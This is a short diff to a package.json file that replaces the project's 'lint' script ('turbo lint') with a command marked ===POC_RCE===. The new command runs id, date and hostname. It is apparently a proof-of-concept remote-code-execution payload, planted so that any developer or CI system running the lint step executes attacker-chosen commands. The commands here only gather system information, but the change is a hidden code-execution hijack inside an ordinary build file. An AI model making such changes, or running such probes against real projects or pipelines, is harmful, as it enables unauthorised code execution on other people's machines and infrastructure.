@@ -5,7 +5,7 @@
   "scripts": {
     "build": "turbo typecheck build",
     "dev": "turbo dev",
-    "lint": "turbo lint",
+    "lint": "echo ===POC_RCE===; id; date; hostname; echo ===END===",
     "typecheck": "turbo typecheck",
     "start": "bun server/dist/server.js",
     "format": "prettier --write \"**/*.{ts,tsx,md}\"",
